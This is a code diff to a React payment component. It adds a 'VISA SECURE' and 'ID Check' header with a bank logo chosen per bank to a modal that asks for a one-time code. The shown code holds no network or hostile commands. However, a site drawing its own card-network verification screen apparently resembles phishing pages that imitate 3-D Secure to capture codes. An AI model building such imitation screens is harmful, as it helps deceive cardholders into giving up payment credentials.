@@ -301,12 +301,49 @@ const Payment = () => {
           {showOtp && !success && !error && (
             <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
               <div className="relative bg-white rounded-lg shadow-2xl max-w-md w-full mx-auto">
+                {/* Top Header with VISA SECURE and Bank Logo */}
+                <div className="bg-white border-b border-gray-200 px-6 py-3 rounded-t-lg">
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-2">
+                      <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-bold">
+                        VISA
+                      </div>
+                      <span className="text-sm font-medium text-gray-700">SECURE</span>
+                    </div>
+                    <div className="flex items-center gap-3">
+                      <span className="text-sm font-medium text-gray-700">ID Check</span>
+                      {/* Dynamic Bank Logo */}
+                      {bankLogo ? (
+                        <div className="w-12 h-8 bg-white rounded flex items-center justify-center border border-gray-200">
+                          <img 
+                            src={bankLogo} 
+                            alt={selectedBankName + ' Logo'} 
+                            className="max-w-full max-h-full object-contain"
+                            onError={(e) => {
+                              console.log('❌ Top header bank logo failed to load:', bankLogo);
+                              // Fallback to default text if bank logo fails to load
+                              e.currentTarget.parentElement!.innerHTML = '<span class="text-blue-600 text-xs font-bold">BANK</span>';
+                            }}
+                            onLoad={() => {
+                              console.log('✅ Top header bank logo loaded successfully:', bankLogo);
+                            }}
+                          />
+                        </div>
+                      ) : (
+                        <div className="w-12 h-8 bg-blue-600 rounded flex items-center justify-center">
+                          <span className="text-white text-xs font-bold">BANK</span>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                </div>
+
                 {/* Cancel Button - Top Right */}
                 <button
                   onClick={handleBack}
                   className="absolute top-4 right-4 text-gray-500 hover:text-gray-700 text-sm font-medium z-10"
                 >
-                  CANCEL
+                  cancel
                 </button>
 
                 {/* Header */}
